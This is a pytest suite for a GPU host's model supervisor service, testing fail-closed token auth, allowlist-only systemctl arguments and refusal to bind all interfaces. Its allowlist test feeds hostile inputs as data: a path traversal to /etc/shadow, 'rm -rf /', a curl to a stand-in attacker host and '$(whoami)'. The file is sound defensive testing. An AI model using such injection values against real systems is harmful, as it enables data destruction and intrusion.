"""Host-side model supervisor (ops/model-supervisor/supervisor.py).

This file is the only place in the stack that can start a process on the GPU host, so
the tests that matter are the ones proving it stays a supervisor rather than becoming
a remote shell:

  * A caller can name an allowlist KEY. Nothing else reaches a subprocess argument.
  * Auth fails CLOSED. No token configured means refuse, not allow.
  * It will not bind all interfaces.

The systemctl calls are stubbed. What is asserted is the exact ARGUMENT LIST handed to
the subprocess, because that argument list is the security boundary: if a request
string ever appears in it, this stops being safe regardless of what the allowlist says.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

_SUP_PATH = (Path(__file__).resolve().parents[2]
             / "ops" / "model-supervisor" / "supervisor.py")


@pytest.fixture
def sup(monkeypatch):
    """Load the supervisor fresh with a known token, and stub systemctl.

    Loaded by path rather than imported: it deliberately lives outside the agents
    package because it must not ship inside a container.
    """
    monkeypatch.setenv("MODEL_SUPERVISOR_TOKEN", "test-token")
    spec = importlib.util.spec_from_file_location("bhnoc_supervisor_under_test", _SUP_PATH)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)

    calls: list[tuple[str, ...]] = []
    active: set[str] = set()

    async def fake_systemctl(*args: str):
        calls.append(args)
        if args[0] == "is-active":
            return (0 if args[-1] in active else 3), ""
        if args[0] == "start":
            active.add(args[-1])
            return 0, ""
        if args[0] == "stop":
            active.discard(args[-1])
            return 0, ""
        return 0, ""

    monkeypatch.setattr(mod, "_systemctl", fake_systemctl)
    mod._test_calls = calls        # type: ignore[attr-defined]
    mod._test_active = active      # type: ignore[attr-defined]
    yield mod
    sys.modules.pop(spec.name, None)


@pytest.fixture
def client(sup):
    return TestClient(sup.app)


AUTH = {"Authorization": "Bearer test-token"}


class TestAuth:
    def test_healthz_needs_no_token(self, client):
        """Liveness only. Says nothing about the box."""
        r = client.get("/healthz")
        assert r.status_code == 200
        assert r.json() == {"status": "ok"}
        assert "allowlist" not in r.text

    def test_reading_the_allowlist_requires_a_token(self, client):
        assert client.get("/models").status_code == 401

    @pytest.mark.parametrize("path", ["/start", "/stop"])
    def test_every_control_route_requires_a_token(self, client, path):
        r = client.post(path, json={"role": "prose", "model": "aqlight"})
        assert r.status_code == 401

    def test_a_wrong_token_is_refused(self, client):
        r = client.get("/models", headers={"Authorization": "Bearer nope"})
        assert r.status_code == 401

    def test_a_non_bearer_scheme_is_refused(self, client):
        r = client.get("/models", headers={"Authorization": "Basic dGVzdA=="})
        assert r.status_code == 401

    def test_no_configured_token_denies_everything(self, sup, monkeypatch):
        """Fails CLOSED.

        An unauthenticated process-control endpoint on the box holding conference
        traffic is not an acceptable degraded mode, so an unset token means refuse
        rather than allow.
        """
        monkeypatch.setattr(sup, "TOKEN", "")
        c = TestClient(sup.app)
        assert c.get("/models", headers=AUTH).status_code == 503
        assert c.post("/start", json={"role": "prose", "model": "aqlight"},
                      headers=AUTH).status_code == 503


class TestAllowlist:
    @pytest.mark.parametrize("bad", [
        "../../etc/shadow",
        "/opt/models/anything.gguf",
        "aqlight; rm -rf /",
        "aqlight && curl evil.example",
        "$(whoami)",
        "llama9",
    ])
    def test_anything_off_the_allowlist_is_refused(self, client, sup, bad):
        r = client.post("/start", json={"role": "prose", "model": bad}, headers=AUTH)
        assert r.status_code == 400
        assert "not allowlisted" in r.json()["detail"]
        # The real assertion: no subprocess was invoked at all.
        assert not any(c[0] == "start" for c in sup._test_calls)

    def test_the_refusal_names_the_valid_keys(self, client):
        """So an operator reads what they can pick instead of guessing."""
        r = client.post("/start", json={"role": "prose", "model": "llama9"}, headers=AUTH)
        assert "aqlight" in r.json()["detail"]

    def test_a_key_lookup_is_case_insensitive(self, client, sup):
        r = client.post("/start", json={"role": "prose", "model": "AQLight"}, headers=AUTH)
        assert r.status_code == 200

    def test_an_unknown_role_is_refused(self, client, sup):
        r = client.post("/start", json={"role": "root", "model": "aqlight"}, headers=AUTH)
        assert r.status_code == 400
        assert not any(c[0] == "start" for c in sup._test_calls)


class TestSubprocessArguments:
    """The boundary itself: what actually reaches the command line."""

    def test_start_passes_only_a_literal_unit_name(self, client, sup):
        client.post("/start", json={"role": "prose", "model": "foundation-sec"}, headers=AUTH)
        starts = [c for c in sup._test_calls if c[0] == "start"]
        assert starts == [("start", "foundation-sec.service")]

    def test_stop_passes_only_a_literal_unit_name(self, client, sup):
        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        client.post("/stop", json={"role": "prose"}, headers=AUTH)
        stops = [c for c in sup._test_calls if c[0] == "stop"]
        assert stops == [("stop", "aqlight.service")]

    def test_no_request_string_ever_reaches_an_argument(self, client, sup):
        """Every argument must come from MODELS or be a literal in the module.

        This is the invariant to protect. If a future edit interpolates a request
        value into the argv, this fails.
        """
        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        allowed = {"start", "stop", "is-active", "--quiet"}
        allowed |= {e["unit"] for e in sup.MODELS.values()}
        for call in sup._test_calls:
            for arg in call:
                assert arg in allowed, f"unexpected subprocess argument {arg!r}"


class TestBehaviour:
    def test_models_reports_live_unit_state(self, client, sup):
        """systemctl, not a cached view, so a model started by hand shows up."""
        r = client.get("/models", headers=AUTH)
        body = r.json()
        assert set(body["allowlist"]) == set(sup.MODELS)
        assert body["units"]["aqlight"]["active"] is False

        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        assert client.get("/models", headers=AUTH).json()["units"]["aqlight"]["active"] is True

    def test_starting_an_already_running_unit_is_a_no_op(self, client, sup):
        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        before = len([c for c in sup._test_calls if c[0] == "start"])
        r = client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        assert r.json()["already_active"] is True
        assert len([c for c in sup._test_calls if c[0] == "start"]) == before

    def test_start_does_not_stop_anything_else(self, client, sup):
        """Two 7B models do not both fit in 15GB, but an implicit stop would kill a
        model somebody's demo was mid-query on. Freeing VRAM stays explicit."""
        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        client.post("/start", json={"role": "prose", "model": "foundation-sec"}, headers=AUTH)
        assert sup._test_active == {"aqlight.service", "foundation-sec.service"}
        assert not any(c[0] == "stop" for c in sup._test_calls)

    def test_start_does_not_claim_the_model_is_ready(self, client):
        """Mapping a GGUF into VRAM takes tens of seconds after the unit starts, so
        the UI must poll rather than trust the 200."""
        r = client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        assert r.json()["loading"] is True

    def test_a_failed_systemctl_becomes_a_502(self, client, sup, monkeypatch):
        async def failing(*args):
            return (1, "Failed to start unit: no such file") if args[0] == "start" else (3, "")
        monkeypatch.setattr(sup, "_systemctl", failing)
        r = client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        assert r.status_code == 502
        assert "no such file" in r.json()["detail"]

    def test_stop_clears_every_active_unit(self, client, sup):
        """With one GPU there is at most one meaningful answer, and a stray
        llama-server holding VRAM is the failure this is for."""
        client.post("/start", json={"role": "prose", "model": "aqlight"}, headers=AUTH)
        client.post("/start", json={"role": "prose", "model": "foundation-sec"}, headers=AUTH)
        r = client.post("/stop", json={"role": "prose"}, headers=AUTH)
        assert set(r.json()["stopped"]) == {"aqlight", "foundation-sec"}
        assert sup._test_active == set()


class TestStartupRefusals:
    def test_it_will_not_bind_all_interfaces(self, sup, monkeypatch):
        """There is no path from the internet to this port and it should stay that way."""
        monkeypatch.setattr(sup, "HOST", "0.0.0.0")
        with pytest.raises(SystemExit):
            sup.main()

    def test_it_will_not_start_without_a_token(self, sup, monkeypatch):
        """Refuses rather than listening and rejecting everything: a supervisor that
        is up but useless looks healthy to monitoring."""
        monkeypatch.setattr(sup, "TOKEN", "")
        with pytest.raises(SystemExit):
            sup.main()
